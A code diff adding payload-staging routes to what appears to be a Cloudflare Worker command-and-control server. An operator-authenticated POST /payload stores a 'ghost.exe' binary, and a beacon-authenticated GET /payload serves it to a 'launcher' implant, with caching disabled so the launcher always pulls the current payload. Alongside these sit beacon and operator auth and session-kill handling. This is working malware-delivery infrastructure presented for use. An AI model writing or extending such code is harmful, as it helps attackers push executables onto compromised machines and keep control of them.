@@ -467,6 +467,60 @@ function handleHealth(): Response {
   return jsonResponse({ status: "ok" });
 }
 
+/**
+ * POST /payload
+ * Operator uploads ghost.exe binary to KV for launcher to fetch.
+ * Body: raw binary bytes (application/octet-stream)
+ * Stored under key: payload:ghost
+ */
+async function handleUploadPayload(request: Request, env: Env): Promise<Response> {
+  const body = await request.arrayBuffer();
+  if (!body || body.byteLength === 0) {
+    return errorResponse("Empty body", 400);
+  }
+  // Enforce 32 MB hard cap — ghost.exe is ~967K, this is generous
+  if (body.byteLength > 32 * 1024 * 1024) {
+    return errorResponse("Payload too large (max 32 MB)", 413);
+  }
+
+  // Store raw bytes in KV — Workers KV accepts ArrayBuffer directly
+  await env.GHOST_KV.put("payload:ghost", body, {
+    expirationTtl: 86400 * 30, // 30 days — rotate on redeploy
+  });
+
+  await logAudit(env.GHOST_KV, {
+    ts: new Date().toISOString(),
+    ip: getClientIP(request),
+    action: "payload_uploaded",
+    detail: { bytes: body.byteLength },
+  });
+
+  console.log(`[payload] uploaded ${body.byteLength} bytes`);
+  return jsonResponse({ status: "ok", bytes: body.byteLength });
+}
+
+/**
+ * GET /payload
+ * Launcher fetches ghost.exe binary — served as raw bytes.
+ * Auth: X-Beacon-Token (same token embedded in launcher.exe)
+ */
+async function handleDownloadPayload(env: Env): Promise<Response> {
+  const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
+  if (!raw) {
+    return errorResponse("Payload not found — upload ghost.exe first via POST /payload", 404);
+  }
+
+  return new Response(raw, {
+    status: 200,
+    headers: {
+      "Content-Type": "application/octet-stream",
+      "Content-Length": String(raw.byteLength),
+      // No caching — launcher always fetches fresh
+      "Cache-Control": "no-store",
+    },
+  });
+}
+
 // ─── Auth Middleware ───────────────────────────────────────
 
 function requireBeaconToken(request: Request, env: Env): Response | null {
@@ -549,6 +603,19 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
     return withCORS(await handleKillSession(request, env, sessionsMatch[1]), env);
+  }
+
+  // ── Payload routes ──
+  if (path === "/payload" && method === "POST") {
+    const authErr = requireOperatorToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleUploadPayload(request, env), env);
+  }
+
+  if (path === "/payload" && method === "GET") {
+    const authErr = requireBeaconToken(request, env);
+    if (authErr) return withCORS(authErr, env);
+    return withCORS(await handleDownloadPayload(env), env);
   }
 
   // ── 404 ──
